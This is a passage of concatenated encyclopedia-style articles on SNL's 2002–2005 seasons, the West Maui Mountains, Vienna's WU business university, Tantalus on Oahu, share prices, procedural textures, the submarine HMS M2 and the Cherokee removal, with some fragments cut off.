the show at the end of the season. Dean Edwards was let go after the season finale. =Opening montage= This season's montage was basically a \\"film negative\\" version of the 2000 montage, using new effects when displaying the cast's title cards. Horatio Sanz's clip was changed. =Cast=Rachel Dratch *Jimmy Fallon *Tina Fey *Darrell Hammond *Chris Kattan *Tracy Morgan *Chris Parnell *Amy Poehler *Maya Rudolph *Horatio Sanz Featuring *Fred Armisen *Dean Edwards *Will Forte *Seth Meyers *Jeff Richards bold denotes \\"Weekend Update\\" anchor Fallon leaves (2003‚Äì2004) The 2003‚Äì04 season would introduce a remodelled stage, modelled after the Grand Central Terminal. Jimmy Fallon decided to leave at the end of this season, announcing his retirement from the cast at the end of his last \\"Weekend Update\\". Jeff Richards mysteriously disappeared from the cast after the episode hosted by Nick Lachey and Jessica Simpson. In an interview, Richards said he left on his own terms to branch out into other projects, though there have been claims that he was fired for creative differences between himself and the director. Finesse Mitchell and Kenan Thompson are hired to replace Tracy Morgan and Dean Edwards as the show's male African-American cast members. Thompson was the first SNL cast member to be younger than the show itself (Thompson was born in 1978, three years after SNL premiered) and the first cast member to get his start on a mainstream children's show (Thompson was a cast member on the Nickelodeon sketch show, All That). =Opening montage= A brand new opening for 2003 has a Grand Central Terminal theme (complementing the new stage), with a \\"first-person\\" camera following the cast members who are found around various sections of the subway, and local eateries. This opener is the first not to credit the Saturday Night Live Band. =Cast=Rachel Dratch *Jimmy Fallon *Tina Fey *Will Forte *Darrell Hammond *Seth Meyers *Chris Parnell *Amy Poehler *Jeff Richards (final episode: January 17, 2004) *Maya Rudolph *Horatio Sanz Featuring *Fred Armisen *Finesse Mitchell *Kenan Thompson bold denotes \\"Weekend Update\\" anchor Rebuilding year (2004‚Äì2005) The 2004‚Äì05 season brought changes to the show after Fallon's leaving. Most notably, Tina Fey and Amy Poehler co-anchored \\"Weekend Update\\", the first time that two women were given the job. Rob Riggle, an officer in the U.S. Marine Corps Reserve, and UCB alum, joined the cast as a featured player in what would be his only season. Riggle would go on to become a correspondent on The Daily Show with Jon Stewart a year later. He would become the third SNL cast member to join The Daily Show after leaving SNL (along with A. Whitney Brown and Nancy Walls) and is the first, and so far only, SNL cast member to have served in the U.S. Marines. In addition to Riggle, Jason Sudeikis (previously a writer on the show since 2003) joined the cast as a featured player with only three episodes left in the season. =Ashlee Simpson incident= An embarrassing event in the career of pop singer Ashlee Simpson occurred live on October 23, 2004. Simpson's second performance of the evening opened with the sound of her pre- recorded voice heard singing the song she had already performed earlier. Despite a quick fadeout, it was obvious that what was heard was not the live voice of the singer. A flustered Simpson did an improvised dance and then left the stage. The New York Times said that the error \\"exposed [Simpson's] use of prerecorded vocals on live television.\\" Simpson's father said that her use of a prerecorded track was necessitated that evening by hoarseness caused by acid reflux disease. The incident subsequently inspired several SNL jokes (including a cold opening where Osama bin Laden [played by Seth Meyers] calls America out for allowing a singer to use backing tracks during a live show) and a few jokes on Saturday Night Live's rival show, MADtv. When questioned by reporters, Lorne Michaels initially denied, then acknowledged, that this was not the first time so-called \\"backing tracks\\" had ever been used on SNL. In October 2005, Simpson returned as a musical guest, performing without incident. =Opening montage= Another brand new montage for 2004 opens on a shot of the Brooklyn Bridge, and shows the cast engaging in conversations around a local nightclub. The text for the cast members' names are capatlized, white, and each letter of their name is spread out. =Cast=Fred Armisen *Rachel Dratch *Tina Fey *Will Forte *Darrell Hammond *Seth Meyers *Chris Parnell *Amy Poehler *Maya Rudolph *Horatio Sanz Featuring *Finesse Mitchell *Rob Riggle *Jason Sudeikis (first episode: May 7, 2005) *Kenan Thompson bold denotes \\"Weekend Update\\" anchor References2000 Saturday Night Live history 2000 Saturday Night Live 2000-2005 ","title":"History of Saturday Night Live (2000‚Äì2005)"},{"id":"30875155","text":"The West Maui Mountains, West Maui Volcano, or Mauna Kahalawai which means \\"holding house of water,\\" is approximately 1.7 million years old Basic Manual for Hawai'i's Tour Drivers/Guides v-6 and forms a much eroded shield volcano that constitutes the western quarter of the Hawaiian Island of Maui.

It has been ranked as one of the best business schools in Europe and received Triple accreditation (AACSB, EQUIS and AMBA). History Old Building of Hochschule f√ºr Welthandel WU was founded on October 1, 1898 as k.u.k. Exportakademie (in English: Export Academy) to provide professional training to future businessmen and thus stimulate the Austro-Hungarian empire's economy. From humble beginnings as a professional school, it quickly grew to become an important institution, which was awarded the status of a fully-fledged Hochschule (an educational institution equivalent to a university, but specializing in a certain field such as technology or business or art) in 1919. At that time, it was renamed to Hochschule f√ºr Welthandel. The course of studies leading to the academic degree of Diplomkaufmann provided training preparing for the export and banking businesses and was very practical, comprising courses in business administration, economics, law and others. In 1930, the Hochschule f√ºr Welthandel was granted the right to issue doctoral degrees. After World War II, the Hochschule f√ºr Welthandel increased its breadth in research. It started to become a very important institution in Austrian society at that time; most Austrian managers and many politicians received their university education here. From 1966 onward, it began to offer a more theoretical course of studies in economics. In 1975, it was renamed to Wirtschaftsuniversit√§t Wien. At the same time, the number of students began to increase dramatically. In 1983, it moved to a campus in Vienna's 9th District. Due to further increasing student numbers during the 1990s the campus became too small. As a consequence, new premises had to be built in Vienna's 2nd district. The new Campus WU opened in October 2013, next to the Vienna Fair Ground. Leadership In January 2015, Edeltraud Hanappi-Egger was elected rector of WU. She is the first female in the history of the University to be elected rector. Her term began on 1 October 2015. WU today Today, WU has more than 20,000 students and over 400 researchers and lecturers, among those about 90 full professors. It increasingly draws students from outside Austria, mostly from Central and Eastern Europe. Most of the faculty are of Austrian or German nationality. New campus The northwest area of the campus Library and Learning Center (left, architect: Zaha Hadid), Departement 1 (right, architect: Laura P. Spinadel) Entrance to the LC Interior of the LC Departement 4, planned by Estudio Carme Pin√≥s Building EA (Executive Academy), planned by NO.MAD Arquitectos (Madrid) The new location is dubbed \\"Campus WU\\" and had its groundbreaking ceremony in October 2009. Close to the Prater public park, and next to the exhibition centre of Vienna, the campus features 6 main building complexes resting on approximately 25 acres (10 ha). The master plan was created by BUSarchitektur under the guidance of the architect Laura P. Spinadel. The buildings of the campus are designed by architectural firms from Spain, the United Kingdom, Germany, Japan and Austria. The dominant element of the campus is the Library & Learning Center, which was planned by Zaha Hadid. Construction began in June 2010 and paved the way for the largest campus for business sciences in Europe. With a total investment of 492 million Euros and a planned construction period of 3 years, the project was concluded in 2013. Campus WU is situated close to the public transport hub Praterstern and is serviced by two stations of the underground line U2 and a number of buses. The LLC has five cores, each with a different complex geometry. The core walls are inclined at different angles and so are the corners which are also rounded with different radii. MEVA has developed and uses both standard and special formwork, or a combination of both, to meet the forming requirements for these complex building parts. Steel formwork, for example, is used for rounded corners if required for structural reasons. Trapezoidal areas of inclined cylindrical corner areas are poured with special Mammut 350 wall formwork panels and special designs of MEVA‚Äôs circular column formwork Circo are used for the tilted and rounded corners. The WU moved to the new site in September 2013. The new address is: WU, Welthandelsplatz 1, 1020 Vienna, Austria. Research Researchers at WU work in the following fields: * Business Administration and all its branches * Economics * Law * Linguistics, focusing on business communications * Socioeconomics * Mathematics and Statistics * Economic History and Economic Geography With students in Austria being free to choose at which university they enroll, WU has become the most popular business and economics university in Vienna and in Austria. Studies Due to its large size, WU is able to offer a very broad range of electives which is probably unparalleled anywhere in German-speaking countries. Beginning in Fall 2006, WU has begun to modify its study programs to a bachelor/master/doctor system in order to align them with the Bologna Process. As at any Austrian or German university, scholars can also achieve a Habilitation at WU. Furthermore, several courses in continuing education are offered (e.g. in marketing and sales, tourism management, logistics & supply chain management). Rankings and Accreditations In 2009 Vienna University of Economics and Business was ranked as one of the best business schools in the German-speaking countries according to Handelsblatt and in 2011 it was ranked 21st in the list of the 392 worldwide leading higher education institutions by the Mines ParisTech : Professional Ranking World Universities. The study obtained the higher education career of the CEOs of the world's leading 500 companies. WU was ranked 42nd in the \\"European Business School Ranking 2014\\" by Financial Times. The Global Executive MBA Program by WU Executive Academy was ranked 44th in the \\"Executive MBA Ranking 2015\\" by Financial Times. The university's master in international management program was ranked 8th in the \\"Masters in Management Ranking 2016\\" by Financial Times. The university is part of the respected consortium of Europe's leading schools and corporate partners - Community of European Management Schools (CEMS). WU has achieved accreditation from the London-based Association of MBAs (AMBA), Brussels-based EQUIS and Tampa-based Association to Advance Collegiate Schools of Business (AACSB International). Only 72 business universities worldwide can claim triple crown accreditation by EQUIS, AACSB, and AMBA. In September 2020 the Master Program Strategy, Innovation and Management Control achieved the 10th place in the QS Masters in Management Ranking which made it the highest ranked Management Master program in the German speaking region.

Scott, \\"The Saga of the Sandwich Islands\\". Nevada: Sierra-Tahoe Publishing Co., 1968. is an extinct cinder cone in the southern Koolau Range on the Hawaiian Island of Oahu. It also has a summit crater, Tantalus Crater. The cinder cone formed after the demise of Koolau Volcano, during a time of rejuvenated-stage volcanism in southeastern Oahu that also formed Punchbowl Crater, Diamond Head and Koko Head as part of the Honolulu Volcanics. Tantalus overlooks the modern city of Honolulu, which is built on top of Tantalus cinders. History The Tantalus Loop was a popular wagon trail from the late 1800s for views and picnic parties. It had \\"rugged canyons, wooded valleys, aromatic eucalyptus giants, stag-horn fern, pungent guava\\", monkeypod, shower cassias, and myrtle, with a two-room, corrugated- roofed \\"Half-Way House\\", managed by 1900s forester David Haugh, offering a welcome stop for trekkers. Many immigrant families of note settled there \\"in cool picturesque seclusion\\", including the Waterhouses, Giffords, Wilders, Dickeys, Davies, Isenbergs, Browns, and Alexanders. A cliff of pitch-black volcanic sand was an attraction on Tantalus until it was mined for blacktopping paths and yards. As part of the U.S. Army's coastal artillery defense system, a fire-control station was built on Tantalus. In conjunction with the fire-control station at Diamond Head, the two positions were used to control coast artillery batteries: at Fort DeRussey and Fort Ruger. The southern slope of Tantalus was bombed in Operation K, Japan's unsuccessful second attack on Oahu, which took place March 4, 1942. Today, Tantalus is a popular destination for hikers, road bicyclists, and skateboarders as well as one of the most frequented tourist spots on Oahu. Starting in 1974, The Tantalus Time Trial, a bicycle race from the bottom to the top of the loop, is the longest continuously running cycling race in Hawai‚Äòi.  Etymology  Tantalus was named in the 19th century by students from Honolulu's Punahou School for Tantalus, the mythological Greek who was eternally frustrated and tempted by water receding out of his reach, unable to quench his thirst.Thrum's Annual, 1928:105-106 \\"Perhaps similarly, as the students climbed, the peak seemed always to recede.\\" This group of students also named other Hawaiian summits like Olympus, Round Top and Sugarloaf.Mary Kawena Pukui, Samuel H.

In layman's terms, the stock price is the highest amount someone is willing to pay for the stock, or the lowest amount that it can be bought for. Behaviour of share prices In economics and financial theory, analysts use random walk techniques to model behavior of asset prices, in particular share prices on stock markets, currency exchange rates and commodity prices. This practice has its basis in the presumption that investors act rationally and without biases, and that at any moment they estimate the value of an asset based on future expectations. Under these conditions, all existing information affects the price, which changes only when new information comes out. By definition, new information appears randomly and influences the asset price randomly. Empirical studies have demonstrated that prices do not completely follow random walks. Low serial correlations (around 0.05) exist in the short term, and slightly stronger correlations over the longer term. Their sign and the strength depend on a variety of factors. Researchers have found that some of the biggest price deviations from random walks result from seasonal and temporal patterns. In particular, returns in January significantly exceed those in other months (January effect) and on Mondays stock prices go down more than on any other day. Observers have noted these effects in many different markets for more than half a century, but without succeeding in giving a completely satisfactory explanation for their persistence. Technical analysis uses most of the anomalies to extract information on future price movements from historical data. But some economists, for example Eugene Fama, argue that most of these patterns occur accidentally, rather than as a result of irrational or inefficient behavior of investors: the huge amount of data available to researchers for analysis allegedly causes the fluctuations. Another school of thought, behavioral finance, attributes non-randomness to investors' cognitive and emotional biases. This can be contrasted with fundamental analysis. When viewed over long periods, the share price is related to expectations of future earnings and dividends of the firm. Over short periods, especially for younger or smaller firms, the relationship between share price and dividends can be quite unmatched. Share prices in the United States Many U.S.-based companies seek to keep their share price (also called stock price) low, partly based on \\"round lot\\" trading (multiples of 100 shares). A corporation can adjust its stock price by a stock split, substituting a quantity of shares at one price for a different number of shares at an adjusted price where the value of shares x price remains equivalent. (For example, 500 shares at $32 may become 1000 shares at $16.) Many major firms like to keep their price in the $25 to $75 price range. A US share must be priced at $1 or more to be covered by NASDAQ. If the share price falls below that level, the stock is \\"delisted\\" and becomes an OTC (over the counter stock). A stock must have a price of $1 or more for 10 consecutive trading days during each month to remain listed. The highest share prices on the NYSE have been those of Berkshire Hathaway class A, trading at over $210,000/share, followed by Seaboard, NVR and Google. History Robert D. Coleman's Evolution of Stock Pricing notes that the invention of double-entry bookkeeping in the fourteenth century led to company valuations being based upon ratios such as price per unit of earnings (from the income statement), price per unit of net worth (from the balance sheet) and price per unit of cash flow (from the funds statement). The next advance was to price individual shares rather than whole companies. A price/dividends ratio began to be used. Following this, the next stage was the use of discounted cash flows, based on the time value of money, to estimate the intrinsic value of stock.

The advantage of this approach is low storage cost, unlimited texture resolution and easy texture mapping.https://www.pcmag.com/encyclopedia/term/49743/procedural-texture These kinds of textures are often used to model surface or volumetric representations of natural elements such as wood, marble, granite, metal, stone, and others. Usually, the natural look of the rendered result is achieved by the usage of fractal noise and turbulence functions. These functions are used as a numerical representation of the \\"randomness\\" found in nature. Solid texturing Solid texturing is a process where the texture generating function is evaluated over \\\\mathbb{R}^{3} at each visible surface point of the model so the resulting material properties (like color, shininess or normal) depends only on their 3D position, not their parametrized 2D surface position like in traditional 2D texture mapping. Consequently, solid textures are unaffected by distortions of the surface parameter space, such as you might see near the poles of a sphere. Also, continuity between the surface parameterization of adjacent patches isn't a concern either. Solid textures will remain consistent and have features of constant size regardless of distortions in the surface coordinate systems.Ebert et al: Texturing and Modeling A Procedural Approach, page 10. Morgan Kaufmann, 2003. Initially these functions were based on simple combination of procedural noise functions like Simplex noise or Perlin noise. Currently a vast arsenal of techniques are available, ranging from structured regular texture (like a brick wall), to structured irregular textures (like a stonewall), to purely stochastic textures. Cellular texturing Cellular Texture Cellular texturing differs from the majority of other procedural texture generating techniques as it does not depend on noise functions as its basis, although it is often used to complement the technique. Cellular textures are based on feature points which are scattered over a three-dimensional space. These points are then used to split up the space into small, randomly tiled regions called cells. These cells often look like \\"lizard scales\\", \\"pebbles\\", or \\"flagstones\\". Even though these regions are discrete, the cellular basis function itself is continuous and can be evaluated anywhere in space.Ebert et al: Texturing and Modeling A Procedural Approach, page 135. Morgan Kaufmann, 2003. Worley noise is a common type of cellular texture. Genetic textures Genetic texture generation is an experimental approach to generate textures. It is an automated process guided by a human moderator. The flow of control usually has a computer generate a set of texture candidates. From these, a user picks a selection. The computer then generates another set of textures by mutating and crossing over elements of the user selected textures.Ebert et al: Texturing and Modeling A Procedural Approach, page 547. Morgan Kaufmann, 2003. For more information on exactly how this mutation and cross over generation method is achieved, see Genetic algorithm. The process continues until a suitable texture for the user is generated. As the outcome is difficult to control, this method is typically used only for experimental or abstract textures. Self-organizing textures Starting from a simple white noise, self- organization processes can lead to structured patterns while preserving some randomness. Reaction‚Äìdiffusion systems are one way of generating such textures. Realistic textures can be generated by simulating complex chemical reactions within fluids. These systems may show behaviors similar to real processes (Morphogenesis) found in nature, such as animal markings (shells, fish, wild cats...).

She was wrecked in Lyme Bay, Dorset, Britain, on 26 January 1932. She was one of three M-class boats completed. Design and career Four M-class submarines replaced the order for the last four K-class submarines, K17-K21. Although they were similar in size, the M class was an entirely different design from the K class, although it is possible that some material ordered for the K-boats went into them. In any event, the end of the First World War meant that only three were completed. M2 was laid down at Vickers shipyard at Barrow in Furness in 1916, and launched in 1919. Like the other members of her class, she was armed with a single fixed 12-inch (305mm) gun as well as torpedo tubes. The Mark IX gun was taken from spares held for the Formidable-class battleships. HMS M2 launching her Parnall Peto seaplane. The M-class submarines were very large for the time at long. They were designed to operate as submarine monitors or cruisers. They displaced on the surface and when submerged. Two 12-cylinder diesel engines producing drove them on the surface; underwater, they were driven by electric motors producing . After the accidental sinking of in 1925, M2 and her sister were taken out of service and reassigned for experimental use. Her 12-inch gun was removed, replaced by a small aircraft hangar, the work being completed in 1927. This could carry a small Parnall Peto seaplane, specially designed for the M2, which, once its wings had been unfolded, could be lowered onto the sea alongside by a derrick for take off. On landing, the aircraft was hoisted back onto the deck and replaced into the hangar. In October 1928, a hydraulic aircraft catapult was fitted, to enable the seaplane to take off directly from the deck.Flightglobal Archive - Aviation History - Flight, 31 July 1931 (p. 759) The submarine was intended to operate ahead of the battle fleet in a reconnaissance role, flying off her unarmed seaplane as a scout.Flight, 31 July 1931 (pp. 762-3) The concept of a submarine cruiser was pursued with , but was not a success and was later abandoned. Accident M2 left her base at Portland on 26 January 1932, for an exercise in West Bay, Dorset, carrying Parnall Peto serial N255. Her last communication was a radio message at 10:11 to her submarine depot ship, , to announce that she would dive at 10:30. The captain of a passing merchant ship, the Newcastle coaster Tynesider, mentioned that he had seen a large submarine dive stern first at around 11:15. Unaware of the significance of this, he only reported it in passing once he reached port.Treadwell 1999, pp. 45‚Äì46. Her entire crew of 60 was killed in the accident.Treadwell 1999, p. 52. The submarine was found on 3 February, eight days after her loss.Treadwell 1999, pp. 47, 50. Ernest Cox, the salvage expert who had raised the German battleships at Scapa Flow, was hired to salvage the M2. In an operation lasting nearly a year and 1,500 dives, on 8 December 1932, she was lifted to within of the surface before a gale sprang up, sending her down to her final resting place. The hangar door was found open and the aircraft still in it. The accident was believed to be due to water entering the submarine through the hangar door, which had been opened to launch the aircraft shortly after surfacing. Two explanations have been advanced. The first is that since the crew were always trying to beat their record time for launching the aircraft, they had opened the hangar door on surfacing while the deck was still awash. The other theory is that the flooding of the hangar was due to failure of the stern hydroplanes. High pressure air tanks were used to bring the boat to the surface in an awash condition, but to conserve compressed air compressors were then started to completely clear the ballast tanks of water by blowing air into them. This could take as long as 15 minutes to complete. The normal procedure for launching the aircraft was therefore to hold the boat on the surface using the hydroplanes whilst the hangar door was opened and the aircraft launched. Failure of the stern hydroplanes would have sent the stern down as observed by the merchant officers and water would have eventually entered the hangar. Aftermath The submarine currently lies upright on the sea bed at (). Her keel is about below the surface at low tide, and her highest point at the top of the conning tower at around . She is a popular dive for scuba divers. The wreck is designated as a \\"protected place\\" under the Protection of Military Remains Act 1986.

Cherokee removal, part of the Trail of Tears, refers to the forced relocation between 1836 and 1839 of an estimated 16,000 members of the Cherokee Nation and 1,000-2,000 of their slaves; from their lands in Georgia, South Carolina, North Carolina, Tennessee, and Alabama to the Indian Territory (present day Oklahoma) in the then Western United States, and the resultant deaths along the way and at the end of the movement of an estimated 4,000 Cherokee and unknown number of slaves. The Cherokee have come to call the event Nu na da ul tsun yi (the place where they cried); another term is Tlo va sa (our removal)‚Äîboth phrases not used at the time, and seems to be of Choctaw origin. Removal actions (voluntary, reluctantly or forcibly) occurred to other American Indian groups in the American South, North, Midwest, Southwest, and the Plains regions. The Chickasaw, Choctaw, Creek, Cherokee and (Muskogee) were removed reluctantly. The Seminole in Florida resisted removal by the United States Army for decades (1817‚Äì1850) with guerrilla warfare, part of the intermittent Native American Wars that lasted from 1540 to 1924. Some Seminole remained in their Florida home country, while others were transported to Native American Territory in shackles. The phrase \\"Trail of Tears\\" is used to refer to similar events endured by other Indian groups, especially among the \\"Five Civilized Tribes\\". The phrase originated as a description of the involuntary removal of the Choctaw Nation in 1831. Beginnings In the fall of 1835, a census was taken by civilian officials of the US War Department to enumerate Cherokee residing in Alabama, Georgia, North/South Carolina, and Tennessee, with a count of 16,542 Cherokee, 201 inter-married whites, and 1592 slaves (total: 18,335 people). Tensions between the indigenous Cherokee and white settlers developed over ownership of the land rich in gold deposits and fertile soil that could be used for farming cotton. In October of that year, Principal Chief John Ross and an Eastern visitor, John Howard Payne, were kidnapped from Ross' Tennessee home by a renegade group of the Georgia militia. Released, Ross and a delegation of tribal leaders traveled to Washington, DC to protest this high-handed action, and to lobby against the removal policy of President Andrew Jackson. In an effort to reach an agreeable compromise Principal Chief John Ross met with President Jackson to discuss the possibility that Cherokee might give up some of their land for money and land to the west of the Mississippi River. Jackson turned this deal down resulting in Ross suggesting $20 million as a base for negotiating the sale of the land and eventually agreeing to let the US Senate decide the sale price. John Ross estimated the value of Cherokee Land at $7.23 million. A conservative estimate by Matthew T. Gregg in 2009 puts Cherokee's land value for the 1838 market at $7,055,469.70, more than $2 million over the $5 million the senate agreed to pay. In this power vacuum, U.S. Agent John F. Schermerhorn gathered a group of dissident Cherokee in the home of Elias Boudinot at the tribal capital, New Echota, Georgia. There on December 29, 1835, this rump group signed the unauthorized Treaty of New Echota, which exchanged Cherokee land in the East for lands west of the Mississippi River in Indian Territory. This agreement was never accepted by the elected tribal leadership or a majority of the Cherokee people. In February 1836, two councils convened at Red Clay, Tennessee and at Valley Town, North Carolina (now Murphy, North Carolina) and produced two lists totaling some 13,000 names written in the Sequoyah writing script of Cherokee opposed to the Treaty. The lists were dispatched to Washington, DC and presented by Chief Ross to Congress. Nevertheless, a slightly modified version of the treaty was ratified by the U.S. Senate by a single vote on May 23, 1836, and signed into law by President Jackson. The treaty provided a grace period until May 1838 for the tribe to voluntarily remove themselves to Indian Territory. Growth in cotton farming and agriculture Until widespread use of the cotton gin, short-staple cotton had been such an arduous crop to grow and process because of the time-consuming process of removing the sticky seeds from each of the individual boles of cotton. This process took so long that it was nearly unprofitable to grow cotton. The increased ease of cotton production due to access to the Cotton Gin, invented in 1793 by Eli Whitney, which used teeth to comb through the fluffy fibers and remove all of the seeds in a much more efficient manner, led to a major rise in the production of cotton in the south near North Carolina, Tennessee and Georgia. Production increased from 750,000 bales in 1830 to 2.85 million bales in 1850, earning the south the nickname King Cotton for its success.Pierson, Parke. \\"Seeds of conflict: tiny cotton seeds had a lot to do with bringing on a big war.\\" America's Civil War Sept. 2009: 25. Academic OneFile. Web. 12 Oct. 2014. Matthew T. Gregg writes that \\"According to the 1835 Cherokee census enumerators, 1,707,900 acres in the Cherokee Nation in Georgia were tillable.\\" This land was valuable farming land, with the ideal climate and the necessary 200 frost-free days for growing cotton, and would have been crucial in supporting the cotton industry's monumental growth, as would have increased ease of transportation due to railroads. The Cherokee Indians typically grew small family farms and only planted what was needed to survive alongside hunting and gathering. Some, however, heeded Silas Dinsmoor's advice. They took advantage of the growing demand for cotton and began to farm it themselves, asking for cotton cards, cotton gins, and spinning wheels from the United States Government.Development of the Cotton Industry by the Five Civilized Tribes in Indian Territory Gilbert C. Fite , Vol. 15, No. 3 (Aug., 1949), pp. 342-353 Published by: Southern Historical Association Article DOI: 10.2307/2198101 Article Stable URL: https://www.jstor.org/stable/2198101 As immigration increased rapidly throughout the 1820s and 1830s, and by 1850 approximately 2.6 million people immigrated to the United States, the government saw that the land could be used for more than just small family crops and could provide a source of income for the farmers immigrating to the south and needing farmable land. The Cherokees that did farm cotton in excess for selling became a threat to the settlers that were hoping to capitalize on the cotton industry by taking away not only valuable farm land but also adding more cotton to the market which could reduce the demand and the price, thus prompting the pursuit of a removal treaty. Georgia gold rush These tensions between Georgia and the Cherokee Nation were brought to a crisis by the discovery of gold near Dahlonega, Georgia, in 1828, resulting in the Georgia Gold Rush, the first gold rush in U.S. history. Hopeful gold speculators began trespassing on Cherokee lands, and pressure began to mount on the Georgia government to fulfill the promises of the Compact of 1802. When Georgia moved to extend state laws over Cherokee tribal lands in 1830, the matter went to the U.S. Supreme Court. In Cherokee Nation v. Georgia (1831), the Marshall court ruled that the Cherokee were not a sovereign and independent nation, and therefore refused to hear the case. However, in Worcester v. State of Georgia (1832), the Court ruled that Georgia could not impose laws in Cherokee territory, since only the national government ‚Äî not state governments ‚Äî had authority in Indian affairs. President Andrew Jackson has often been quoted as defying the Supreme Court with the words, \\"John Marshall has made his decision; now let him enforce it!\\" Jackson probably never said this, but he was fully committed to the policy. He had no desire to use the power of the national government to protect the Cherokee from Georgia, since he was already entangled with states' rights issues in what became known as the nullification crisis. With the Indian Removal Act of 1830, the U.S. Congress had given Jackson authority to negotiate removal treaties, exchanging Indian land in the East for land west of the Mississippi River. Jackson used the dispute with Georgia to put pressure on the Cherokee to sign a removal treaty.Remini, Andrew Jackson, p. 257, Prucha, Great Father, p. 212. Georgia and the Cherokee Nation The rapidly expanding population of the United States early in the 19th century created tensions with Native American tribes located within the borders of the various states. While state governments did not want independent Indian enclaves within state boundaries, Indian tribes did not want to relocate or to give up their distinct identities. With the Compact of 1802, the state of Georgia relinquished to the national government its western land claims (which became the states of Alabama and Mississippi). In exchange, the national government promised to eventually conduct treaties to relocate those Indian tribes living within Georgia, thus giving Georgia control of all land within its borders. However, the Cherokee, whose ancestral tribal lands overlapped the boundaries of Georgia, Tennessee, North Carolina, and Alabama, declined to move. They established a capital in 1825 at New Echota (near present-day Calhoun, Georgia). Furthermore, led by principal Chief John Ross and Major Ridge, the speaker of the Cherokee National Council, the Cherokee adopted a written constitution on 26 July 1827, declaring the Cherokee Nation to be a sovereign and independent nation. With this constitution, an election was held for Principal Chief. John Ross won the first election and became the leader and representative of the tribe. In 1828, the Cherokee government established a law that addressed the issue of removal. The law stated that anyone who signed an agreement with the United States that addressed the Cherokee land without consent of the Cherokee government would be considered treasonous and could be punishable by death. The Cherokee land that was lost proved to be extremely valuable. Upon these lands were the alignments for the future rights-of-way for rail and road communications between the eastern Piedmont slopes of the Appalachian Mountains, the Ohio River in Kentucky and the Tennessee River Valley at Chattanooga. This location is still a strategic economic asset and is the basis for the tremendous success of Atlanta, Georgia, as a regional transportation and logistics center. Georgia's appropriation of these lands from the Cherokee kept the wealth out of the hands of the Cherokee Nation. The Cherokee lands in Georgia were settled upon by the Cherokee for the simple reason that they were and still are the shortest and most easily traversed route between the only fresh water sourced settlement location at the southeastern tip of the Appalachian range (the Chattahoochee River), and the natural passes, ridges, and valleys which lead to the Tennessee River at what is today, Chattanooga. From Chattanooga there was and is the potential for a year-round water transport to St. Louis and the west (via the Ohio and Mississippi rivers), or to as far east as Pittsburgh, PA. Treaty of New Echota Chief John Ross, opponent of the Treaty of New Echota Major Ridge, of the \\"Treaty Party\\". Illustration from History of the Indian Tribes of North America. With the landslide reelection of Andrew Jackson in 1832, some of the most strident Cherokee opponents of removal began to rethink their positions. Led by Major Ridge, his son John Ridge, and nephews Elias Boudinot and Stand Watie, they became known as the \\"Ridge Party\\", or the \\"Treaty Party\\". The Ridge Party believed that it was in the best interest of the Cherokee to get favorable terms from the U.S. government, before white squatters, state governments, and violence made matters worse. John Ridge began unauthorized talks with the Jackson administration in the late 1820s. Meanwhile, in anticipation of the Cherokee removal, the state of Georgia began holding lotteries in order to divide up the Cherokee tribal lands among white Georgians. However, Principal Chief John Ross and the majority of the Cherokee people remained adamantly opposed to removal. Political maneuvering began: Chief Ross canceled the tribal elections in 1832, the Council threatened to impeach the Ridges, and a prominent member of the Treaty Party (John Walker, Jr.) was murdered. The Ridges responded by eventually forming their own council, representing only a fraction of the Cherokee people. This split the Cherokee Nation into two factions: those following Ross, known as the National Party, and those of the Treaty Party, who elected William A. Hicks, who had briefly succeeded his brother Charles R. Hicks as Principal Chief of the Cherokee Nation to act as titular leader of the pro-Treaty faction, with former National Council clerk Alexander McCoy as his assistant. John Ross states in his letter to congress, \\"By the stipulations of this instrument, we are despoiled of our private possessions, the indefeasible property of individuals. We are stripped of every attribute of freedom and eligibility for legal self-defence. Our property may be plundered before our eyes; violence may be committed on our persons; even our lives may be taken away, and there is none to regard our complaints. We are denationalized; we are disfranchised. We are deprived of membership in the human family! We have neither land nor home, nor resting place that can be called our own. And this is effected by the provisions of a compact which assumes the venerated, the sacred appellation of treaty. We are overwhelmed! Our hearts are sickened, our utterance is paralyzed, when we reflect on the condition in which we are placed, by the audacious practices of unprincipled men, who have managed their stratagems with so much dexterity as to impose on the Government of the United States, in the face of our earnest, solemn, and reiterated protestations.\\" In 1835, Jackson appointed Reverend John F. Schermerhorn as a treaty commissioner. The U.S. government proposed to pay the Cherokee Nation US$4.5 million (among other considerations) to remove themselves. These terms were rejected in October 1835 by the Cherokee Nation Council meeting at Red Clay. Chief Ross, attempting to bridge the gap between his administration and the Ridge Party, traveled to Washington with a party that included John Ridge and Stand Watie to open new negotiations, but they were turned away and told to deal with Schermerhorn. Meanwhile, Schermerhorn organized a meeting with the pro-removal council members at New Echota, Georgia. Only five hundred Cherokee (out of thousands) responded to the summons, and, on December 30, 1835, twenty-one proponents of Cherokee removal (Major Ridge, Elias Boudinot, James Foster, Testaesky, Charles Moore, George Chambers, Tahyeske, Archilla Smith, Andrew Ross (younger brother of Chief John Ross), William Lassley, Caetehee, Tegaheske, Robert Rogers, John Gunter, John A. Bell, Charles Foreman, William Rogers, George W. Adair, James Starr, and Jesse Halfbreed), signed or left \\"X\\" marks on the Treaty of New Echota after those present voted unanimously for its approval. John Ridge and Stand Watie signed the treaty when it was brought to Washington. Chief Ross, as expected, refused. This treaty gave up all the Cherokee land east of the Mississippi in return for five million dollars to be disbursed on a per capita basis, an additional half-million dollars for educational funds, title in perpetuity to an amount of land in Indian Territory equal to that given up, and full compensation for all property left in the East. There was also a clause in the treaty as signed allowing Cherokee who so desired to remain and become citizens of the states in which they resided on of land, but that was later stricken out by President Jackson. Despite the protests by the Cherokee National Council and principal Chief Ross that the document was a fraud, Congress ratified the treaty on May 23, 1836, by just one vote. Removal process The process of Cherokee removal took place in three stages. It began with the voluntary removal of those in favor of the treaty, who were willing to accept government support and move west on their own in the two years after the signing of the Treaty of New Echota in 1835. Most of the Cherokee, including Chief John Ross, were outraged and unwilling to move, and they reacted with opposition. They did not believe the government would take any action against them if they elected to stay. However, the U.S. army was sent in, and the forced removal stage began. The Cherokee were herded violently into internment camps, where they were kept for the summer of 1838. The actual transportation west was delayed by intense heat and drought, but in the fall, the Cherokee reluctantly agreed to transport themselves west under the supervision of Chief Ross in the reluctant removal stage. =Voluntary removal= The Treaty provided a two-year grace period for Cherokee to willingly emigrate to Indian Territory. However, President Andrew Jackson dispatched General John E. Wool to begin the process of rounding up all those who would accept government provisions and prepare them for removal. Upon arrival, the staunch opposition to the treaty was evident to General Wool as the provisions were rejected by nearly all that he came in contact with, and it seemed that no one would voluntarily remove themselves. Due to the staunch opposition, preparations did not begin for several months, 